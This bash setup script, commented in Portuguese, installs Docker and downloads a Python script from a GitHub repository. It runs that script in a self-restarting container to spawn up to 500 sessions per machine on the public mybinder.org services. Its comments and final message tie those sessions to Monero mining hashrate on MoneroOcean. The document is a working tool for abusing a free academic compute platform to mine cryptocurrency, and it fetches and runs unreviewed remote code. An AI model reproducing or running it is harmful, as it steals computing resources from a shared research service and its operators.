#!/bin/bash
# ============================================================
# SETUP BINDER EM 1 MAQUINA DOCKER
# Uso:  bash setup.sh 1     (1-5, numero da maquina)
# Cada maquina cria ate 500 pods Binder (1core/2GB, 100-500 H/s cada)
# Total 5 maquinas = 2500 pods = quintuplo de hashrate
# ============================================================
N=${1:-1}
PREF="dock${N}"
echo ">>> Maquina $N (prefixo $PREF)"

# 1) Instalar docker (se faltar)
if ! command -v docker >/dev/null 2>&1; then
  echo ">>> Instalando docker..."
  apt-get update -y && apt-get install -y docker.io || curl -fsSL https://get.docker.com | sh
fi

# 2) Criar pasta e arquivos
mkdir -p /opt/binder && cd /opt/binder

cat > Dockerfile <<'EOF'
FROM python:3.11-alpine
RUN apk add --no-cache ca-certificates && pip install --no-cache-dir requests websockets
WORKDIR /app
COPY auto_binder_500.py /app/auto_binder_500.py
CMD ["python", "-u", "auto_binder_500.py", "500", "gesis.mybinder.org|bids.mybinder.org|2i2c.mybinder.org", "5"]
EOF

# baixa o binder (fonte unica no repo - sempre atualizado)
curl -sL -o auto_binder_500.py https://raw.githubusercontent.com/conta80297-pixel/testemine123/main/auto_binder_500.py
if [ ! -s auto_binder_500.py ]; then echo "ERRO: download do binder falhou"; exit 1; fi


# 3) Build imagem
docker build -t binder-img .

# 4) Rodar container (reinicia sozinho se cair)
docker rm -f binder-$N 2>/dev/null
docker run -d --name binder-$N --restart unless-stopped --memory 384m --memory-swap 512m --cpus 1 -e BINDER_PREFIX=$PREF -e BINDER_LOG=0 binder-img
sleep 5
echo ">>> Container:"
docker ps --filter name=binder-$N
echo ">>> Log (primeiros segundos):"
docker logs --tail 20 binder-$N
echo ">>> DONE - maquina $N rodando. Veja hashrate no dashboard MoneroOcean (workers dock${N}binder1..17)"
